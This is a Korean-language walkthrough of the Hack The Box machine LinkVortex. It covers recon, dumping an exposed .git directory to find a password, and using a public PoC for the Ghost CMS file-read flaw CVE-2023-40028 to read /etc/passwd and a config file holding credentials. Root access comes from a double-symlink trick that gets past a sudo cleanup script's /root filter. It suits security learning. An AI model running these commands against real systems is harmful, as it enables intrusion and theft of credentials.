# HTB-LINKVORTEX
```bash
OS:Linux
DATE: 26.10.09
DIFFICULTY: Easy
```

## RECON
**nmap**: 초기 접근을 위해 전체 포트 검사와 상세 포트 검사를 진행하였다
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 22,80 IP
```
```bash
sudo nmap -sUV --top-ports 100 IP
```
검사 결과 80번 http 서비스가 동작한다는 것을 알게 되어 접속하였다. 접속 결과 linkvortex.htb으로 리다이렉션이 되어 `/etc/hosts`에 도메인을 추가해주었다
```bash
sudo nano /etc/hosts
```
이후 웹 디렉토리 및 서브도메인 FUZZING을 진행하였다
```bash
ffuf -u http://linkvortex.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
```bash
ffuf -u http://linkvortex.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://linkvortex.htb -H "Host: FUZZ.linkvortex.htb"  
```
검사 결과 서브도메인 **dev**를 발견할 수 있었고, 웹 디렉토리 **ghost** 등등이 있다는 것을 발견할 수 있었다. 따라서 발견한 서브도메인을 도메인 안에 추가해주었다

## Initial Access 
초기 접근을 위해 기본 http 서비스에 접속한 결과 `BitByBit`라는 하드웨어 정보 관련 웹사이트인 것을 알게 되었다. 이후 /ghost에 접속한 결과 sign을 할 수 있는 페이지가 있었다. 다음으로 dev 서브도메인 서비스에 접속하였다. 접속한 결과 준비 중이라는 메시지만 뜨고 별다른 것을 발견하지 못하여 dev 도메인 fuzzing을 진행해주었다
```bash
ffuf -u http://dev.linkvortex.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r
```
실행 결과 **.git** 엔드포인트를 발견할 수 있었다. 따라서 gitdumper 도구를 사용하여 dump해주었다
```bash
python3 git_dumper.py http://dev.linkvortex.htb/.git ./git
```
이후 dump를 해준 후 소스코드를 살펴보았다. 정말 많은 소스코드들이 있었고 필터를 이용하여 password 단어만 찾는 행동을 하였지만 그럼에도 많았고, 그중 몇 가지 크레덴셜이 나와 아까 발견한 signup 페이지에서 로그인을 시도하였지만 모두 실패하였다. 따라서 commit 기록을 확인하여 크레덴셜 노출이 있는지 확인하였다
```bash
git log --oneline

299cdb4 (HEAD, tag: v5.58.0) v5.58.0
dce2e68 Added Tips&Donations link to portal links (#17580)
3562560 Data generator: Ensure order of newsletters is correct
4ff4677 Entirely rewrote data generator to simplify codebase
cf947bc Optimised react-query caching to prevent excessive requests (#17595)
77cc6df AdminX Newsletters refinements (#17594)
24ea4c0 Updated Tips&Donations portal success and loading states design (#17592)
be7a2d0 Updated Tips & donations settings design (#17591)
7f6de07 Removed unconsistent success state from the donation page (#17590)
7e9b2d4 Fixed donations checkout for logged-off readers (#17589)
19bdb0e Added migrations for Tips & Donations' settings (#17576)
c06ba9b 2023 (2)
265e622 2023
21f57c5 Added remaining wiring to AdminX Newsletters (#17587)
d960b12 Added enable newsletter toggle in AdminX settings (#17582)
af7ce52 Added source to beta editor feedback (#17586)
f26203f Updated Tips & donations settings (#17585)
262c6be 🐛 Fixed member filtering on newsletter subscription status (#17583)
81ef2ad Merged v5.57.3 into main
34b6f19 (grafted, tag: v5.57.3) v5.57.3
c467611 (grafted) Cleaned up AdminX API handling (#17571)
```
```bash
git show 299cdb4
```
확인 결과 ghost CMS가 5.57대 버전인 것을 알게 되었다. 하지만 실질적으로 찾으려 했던 크레덴셜은 여전히 확보하지 못하였다. 따라서 `git status`를 활용하여 현재 커밋이 되지 않은 것이 있는지 확인해주었다
```bash
git status

Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   Dockerfile.ghost
        modified:   ghost/core/test/regression/api/admin/authentication.test.js
```
따라서 git diff --staged로 바뀐 내용을 확인해주었다. 확인 결과 바뀐 비밀번호 내용이 있었다
```bash
git diff --staged

         it('complete setup', async function () {
             const email = 'test@example.com';
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';

             const requestMock = nock('https://api.github.com')
                 .get('/repos/tryghost/dawn/zipball')

```
이후 새로 발견한 비밀번호를 가지고 아까 발견한 로그인 사이트에서 시도하였다. 하지만 로그인이 되지 않았다. 알고 보니 email, 즉 test@example.com은 예시 이메일이었고 내가 사용하고 있는 도메인으로 바꿔줘야 했다. 따라서 admin@linkvortex.htb으로 추측하여 시도한 결과 로그인을 성공하였다.

이후 아까 ghost 5.57대라는 버전 정보를 얻어 exploit을 검색한 결과 **CVE-2023-40028** LFI 취약점이 있다는 것을 알게 되었다. 따라서 [PoC](https://github.com/godylockz/CVE-2023-40028)를 사용하여 취약한 파일 목록들을 추출해보았다. 먼저 /etc/passwd로 테스트하였다
```bash
python3 ghost_fileread.py \
  --url http://linkvortex.htb/ghost \
  --username admin@linkvortex.htb \
  --password 'OctopiFociPilfer45' \
  --file /etc/passwd
```
하지만 계속해서 실패하였다. 원인은 /ghost 엔드포인트를 붙여서 실패하였던 것이었다. 따라서 지우고 다시 시도한 결과 passwd 목록을 확인할 수 있었다. 이후 ghost의 정보가 있는 `/var/lib/ghost/config.production.json`를 추출해보았다. 이번에는 쿠키를 이용하여 exploit해보았다
```bash
python3 ghost_fileread.py --url http://linkvortex.htb --cookie 's%3AxMrB-jp0UhVuvmmN1wFZAn8NMlAzgT0l.aesoEDlTYOEG0lrYS47gbVGR1gm1XVBR7fGZbjbu%2FPU' --file ../../../../../../var/lib/ghost/config.production.json

[*] Checking authentication (cookie) ...
[+] Admin session is valid.
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```
이후 bob 계정으로 ssh 접속을 시도한 결과 유저 쉘을 얻을 수 있었다

![user](attach_real/Pasted%20image%2020261012164052.png)

## Privilege Escalation

권한 상승을 위해 sudo -l을 시도한 결과 `NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png  ` 이렇게 세팅되어 있었다. 따라서 스크립트를 확인해주었다
```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```
대상 스크립트는 png와 심볼릭되어 있는 것을 확인하여, 만약 심볼릭 상태면 어떤 폴더에 결과를 넣어주는 것 같았다. 하지만 심볼릭되어 있는 파일이 /etc나 /root면 block을 하기에 우회를 해주어야 했다. 따라서 두 개를 만들어주었다
```bash
ln -s /root/root.txt test.txt
```
```bash
ln -s test.txt test.png
```
이후 이것을 스크립트로 실행시켜주었다
```bash
sudo bash /opt/ghost/clean_symlink.sh test.png

Link found [ test.png ] , moving it to quarantine
```
하지만 출력이 되지 않았다. 왜냐하면 출력이 되려면 `CHECK_CONTENT=true`여야 하기에 대상 변수를 추가해주고 다시 한 번 더 시도하였다
```bash
sudo CHECK_CONTENT=true bash /opt/ghost/clean_symlink.sh test.png

Link found [ ss.png ] , moving it to quarantine
Content:
```
하지만 출력이 되지 않았다. 이유를 알아보니 clean_symlink.sh은 모든 명령을 절대경로로 호출하여, ln으로 링크를 연결해줄 때 상대경로가 아니라 절대경로로 설정해주어야 했다. 따라서 수정 후 다시 시도하였다
```bash
ln -s /root/root.txt /home/bob/test.txt
```
```bash
ln -s /home/bob/test.txt /home/bob/test.png
```
```bash
sudo CHECK_CONTENT=true bash /opt/ghost/clean_symlink.sh test.png
```

따라서 루트 플래그를 뽑는 것이 가능했다

![root](attach_real/Pasted%20image%2020261012172537.png)



## New Inform
- git은 세 개의 방이 있다. 1. Working Directory: 내가 실제로 수정하고 하는 곳, 디스크 안 2. Staging Area: 이번에 기록을 남길 것들을 담아두는 **대기실** 3. Repository: 저장소. 커밋 완료된 기록들이 쌓이는 곳
- git diff: 두 상태의 차이점을 보여주는 것. 원래 내가 passwd 1234를 passwd 1111로 바꿨으면 바뀌기 전 것은 -, 바뀐 후는 +로 표시된다
- git staged = git add 상태. git --cached도 똑같은 뜻
- 앞으로 git dump를 하게 된다면 status를 먼저 확인
- 나의 도메인과 다르면 나의 도메인을 대입하여 추측할 수 있다
- 만약 PoC가 안 먹으면 엔드포인트도 바꿔봐야 한다
- -L은 심볼릭 링크
- 심볼릭 링크는 무조건 절대경로로 만들어야 한다
- bash 스크립트 잘 분석하자